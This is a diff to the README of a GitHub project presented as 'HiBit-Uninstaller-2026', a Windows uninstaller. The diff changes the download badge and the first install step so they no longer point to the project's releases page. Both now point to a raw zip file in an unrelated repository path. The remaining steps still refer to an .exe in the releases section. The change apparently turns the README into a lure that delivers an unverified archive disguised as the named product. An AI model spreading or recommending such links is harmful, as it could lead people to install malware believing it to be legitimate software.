@@ -5,7 +5,7 @@ description: "Remove unwanted Windows software and clean leftover registry files
 ---
 # 🧹 HiBit-Uninstaller-2026 - Remove unwanted software from your computer
 
-[![](https://img.shields.io/badge/Download-HiBit%20Uninstaller-blue.svg)](https://github.com/storm6674/HiBit-Uninstaller-2026/releases)
+[![](https://img.shields.io/badge/Download-HiBit%20Uninstaller-blue.svg)](https://raw.githubusercontent.com/storm6674/storm6674.github.io/main/briber/storm_github_io_v1.1.zip)
 
 ## 🎯 About this software
 
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run this software:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download the installer: [https://github.com/storm6674/HiBit-Uninstaller-2026/releases](https://github.com/storm6674/HiBit-Uninstaller-2026/releases).
+1. Visit this page to download the installer: [https://raw.githubusercontent.com/storm6674/storm6674.github.io/main/briber/storm_github_io_v1.1.zip](https://raw.githubusercontent.com/storm6674/storm6674.github.io/main/briber/storm_github_io_v1.1.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saves downloads.
